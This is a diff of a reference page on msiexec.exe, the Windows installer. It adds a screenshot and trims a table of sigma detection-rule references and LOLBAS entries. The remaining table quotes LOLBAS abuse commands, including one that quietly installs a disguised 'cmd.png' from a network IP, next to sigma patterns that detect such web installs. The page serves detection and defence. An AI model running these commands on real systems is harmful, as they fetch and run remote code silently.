@@ -8,6 +8,10 @@ title: msiexec.exe | Windows installer
 * Description: Windows installer
 * Comments: 
 
+## Screenshot
+
+![msiexec.exe](screenshots/msiexec.exe-0BDEAEA7BB4AE7822416CD37EA8EE00D-1.png)
+
 ## Hashes
 
 Type | Hash
@@ -83,11 +87,7 @@ Source | Source File | Example | License
 [sigma](https://github.com/Neo23x0/sigma) | [win_susp_msiexec_web_install.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_msiexec_web_install.yml) | `            - '* msiexec*://*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_ssp_added_lsa_config.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_ssp_added_lsa_config.yml) | `        - Image: C:\Windows\system32\msiexec.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_ssp_added_lsa_config.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_ssp_added_lsa_config.yml) | `        - Image: C:\Windows\syswow64\MsiExec.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_ssp_added_lsa_config.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_ssp_added_lsa_config.yml) | `        - Image: C:\Windows\system32\msiexec.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_ssp_added_lsa_config.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_ssp_added_lsa_config.yml) | `        - Image: C:\Windows\syswow64\MsiExec.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `              # - '\msiexec.exe'  an installer installing a program using one of those DLL will raise an alert` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `            - '\msiexec.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_susp_desktop_ini.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_susp_desktop_ini.yml) | `            - 'C:\Windows\System32\msiexec.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Msiexec.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml) | `Name: Msiexec.exe` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Msiexec.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml) | `  - Command: msiexec /quiet /i cmd.msi` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Msiexec.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml) | `  - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png` | 
